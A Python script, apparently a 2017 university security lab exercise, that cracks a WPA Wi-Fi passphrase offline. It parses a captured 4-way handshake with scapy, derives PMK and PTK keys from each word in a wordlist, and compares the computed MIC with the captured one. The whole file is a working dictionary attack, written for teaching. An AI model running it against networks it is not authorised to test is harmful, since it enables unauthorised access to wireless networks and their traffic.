#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__      = "Rébecca Tevaearai et Rosy-Laure Wonjamouna"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


# Read capture file
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation
A           = "Pairwise key expansion" #this string is used in the pseudo-random function

# On récupère le ssid à partir du paquet 3
ssid = wpa[3].info.decode()
# On récupère le MAC de l'AP à partir du paquet 1
APmac = a2b_hex(wpa[1].addr1.replace(':', ''))
# On récupère le MAC du client à partir du paquet 1
Clientmac = a2b_hex(wpa[1].addr3.replace(':', ''))

# Authenticator and Supplicant Nonces
# On récupère le authenticator nonce à partir du paquet 5 (1e paquet du 4way handshake)
ANonce = wpa[5].load[13:45]
# On récupère le supplicant nonce à partir du paquet 6 (2e paquet du 4way handshake)
SNonce = Dot11Elt(wpa[6]).load[65:97]

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = Dot11Elt(wpa[8]).load[129:-2].hex()
B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
data = a2b_hex(Dot11Elt(wpa[8]).load[48:].hex().replace(mic_to_test, "0"*len(mic_to_test)))

ssid = str.encode(ssid)

# On ouvre et lit le fichier wordlist susceptible de contenir la bonne passphrase
f = open("wordlist.txt")
lines = f.readlines()

for line in lines:
    line = line.replace("\n", "")

    print ("Passphrase: ",line,"\n")

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passPhrase  = str.encode(line)
    
    # Calcul de pmk avec pbkdf2
    pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk,str.encode(A),B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)

    # On compare le MIC obtenu avec la passphrase potentielle avec le MIC contenu dans le 4e paquet du 4-way handshake
    if mic.hexdigest()[:-8] == mic_to_test:

        print("Correct passphrase:", passPhrase)
        print ("\nResults of the key expansion")
        print ("=============================")
        print ("PMK:\t\t",pmk.hex(),"\n")
        print ("PTK:\t\t",ptk.hex(),"\n")
        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
        print ("TK:\t\t",ptk[32:48].hex(),"\n")
        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
        print ("MIC:\t\t",mic.hexdigest(),"\n")

        exit()

print("no correct passphrase")
